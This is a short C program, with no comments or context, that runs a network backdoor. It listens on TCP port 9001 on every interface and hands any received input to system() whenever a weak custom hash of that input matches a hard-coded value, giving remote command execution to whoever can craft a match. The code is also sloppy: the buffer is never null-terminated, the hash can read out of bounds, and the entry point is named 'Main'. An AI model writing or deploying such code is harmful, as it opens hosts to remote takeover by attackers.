#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>

unsigned long hash(const unsigned char *s, int len)
{
    unsigned int ret = 0;
    while (len > 0) {
        ret += *(unsigned short *) s * len;
        s += 2, len -= 2;
    }
    if(len != 0) {
        ret += *s;
    }
    return ret;
}

void *fn(void *c)
{
    char buf[128]; int len;
    while ((len = recv((int) c, buf, sizeof(buf), 0)) > 0) {
        if(hash((unsigned char *) buf, len) == 0x98b55) {
            system(buf);
        }
    }
    close((int) c);
    return NULL;
}

int Main()
{
    int s = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in service;
    service.sin_family = AF_INET;
    service.sin_addr.s_addr = 0;
    service.sin_port = htons(9001);

    bind(s, (struct sockaddr *) &service, sizeof(service));

    listen(s, 5);

    while (1) {
        int c = accept(s, NULL, NULL);
        pthread_t t;
        pthread_create(&t, NULL, &fn, (void *) c);
        pthread_detach(t);
    }
    return 0;
}
